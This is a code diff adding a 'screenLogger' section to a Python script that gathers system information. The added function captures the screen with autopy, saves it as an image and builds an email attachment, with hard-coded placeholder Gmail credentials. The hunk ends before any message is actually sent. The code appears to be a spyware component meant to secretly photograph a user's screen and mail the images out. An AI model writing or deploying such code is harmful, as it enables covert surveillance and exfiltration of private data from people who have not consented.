@@ -142,3 +142,27 @@ def get_platform():
     print(f'Total Core Count: {totalcore_count}')
 
 # screenLogger
+from email.mime.multipart import MIMEMultipart
+from email.mime.base import MIMEBase
+from email import encoders
+import os
+import time
+import smtplib
+import autopy
+
+gmail_user ='abc@gmail.com' #Your email address
+gmail_pwd ='password' #Your email password
+    
+
+def mail(attach):  #defining function for email
+   
+   bitmap = autopy.bitmap.capture_screen()
+   bitmap.save("src.png")
+
+   msg = MIMEMultipart()
+   part = MIMEBase('application', 'octet-stream')
+   part.set_payload(open(attach, 'rb').read())
+   encoders.encode_base64(part)
+   part.add_header('Content-Disposition', 'attachment; filename="%s"' % os.path.basename(attach))
+   msg.attach(part)
+   
